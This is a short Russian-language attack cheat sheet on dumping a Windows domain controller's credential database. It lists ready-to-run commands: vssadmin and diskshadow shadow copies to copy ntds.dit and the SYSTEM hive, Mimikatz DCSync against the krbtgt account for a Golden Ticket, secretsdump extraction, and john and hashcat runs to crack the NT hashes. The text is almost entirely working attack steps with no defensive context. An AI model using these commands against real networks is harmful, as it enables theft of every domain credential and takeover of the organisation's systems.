#windows #AD #attacks 

> Атака на Контроллер домена, вызванная механизмом **репликации** в Windows

### Должна быть либо привилегия админа, либо привилегия на репликацию

# Цель

# ntds.dit 

(_**N**ew **T**echnologies **D**irectory **S**ervices . **D**irectory **I**nformation **T**ree_)
`C:\Windows\NTDS\ntds.dit`


Но файл всегда занят системно
! НО

Его копия всегда доступна

## Tools

### 1) vssadmin (lolbin)

Cоздание теневой копии диска _C:\_. Это позволяет «восстанавливать» предыдущие версии файла (штатная утилита для своего рода бэкапа), в том числе и копию _ntds.dit_

```cmd
`vssadmin create shadow /for=c:`
```

```cmd
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy

copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
```

## 2) diskshadow (lolbin)

Также создает теневую копию диска

```cmd
diskshadow
set context persistent nowriters

set metadata c:\exfil\metadata.cab

add volume c: alias ntdss

create

expose %ntdss% z:
```


## 3) Mimikatz/secretsdump

Получаем необходимые данные для проведения атаки `Golden Ticket`
```mimikatz
lsadump::dcsync /user:<blabla>\krbtgt
```


```mimikatz
lsadump::dcsync /all /csv
```
``

```powershell
secretsdump.py -system <путь до файла SYSTEM (стащили с теневой копии Z:\Windows\System32\config\SYSTEM)> -ntds <путь до файла NTDS.DIT> LOCAL
```



## Использование полученных хэшей

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hashes.txt.ntds
```

```bash
hashcat -m 1000 hashes.txt.ntds /usr/share/wordlists/rockyou.txt -O -w 3 -o cracked.txt
```


